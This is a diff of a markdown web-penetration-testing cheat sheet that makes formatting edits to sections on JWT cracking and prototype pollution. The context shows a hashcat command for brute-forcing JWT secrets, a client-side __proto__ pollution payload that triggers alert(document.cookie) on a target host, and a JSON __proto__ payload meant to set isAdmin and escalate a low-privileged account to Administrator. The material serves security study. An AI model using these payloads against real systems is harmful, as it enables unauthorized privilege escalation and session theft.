@@ -1223,7 +1223,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ```html
 <script>
-    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
+    location="https://TARGET.NET/#__proto__[hitCallback]=alert%28document.cookie%29"
 </script>  
 ```  
 
@@ -1233,7 +1233,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ### __Proto__ Privilege Escalate  
 
->To identify Proto pollution, insert the follow into a JSON post request when updating a user profile information authenticated as low privileged role.  
+>To ***identify*** Proto pollution, insert the follow into a JSON post request when updating a user profile information authenticated as low privileged role.  
 
 ```JSON
 "__proto__": {
@@ -1243,7 +1243,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ![identify __proto__](images/identify__proto__.png)  
   
->Observe the ```isAdmin``` property and resend the POST update account with the __proto__ payload below to elevate our access role to Administrator.  
+>Observe the ```isAdmin``` property and resend the POST update account with the ```__proto__``` payload below to elevate our access role to Administrator.  
 
 ```JSON
 "__proto__": {
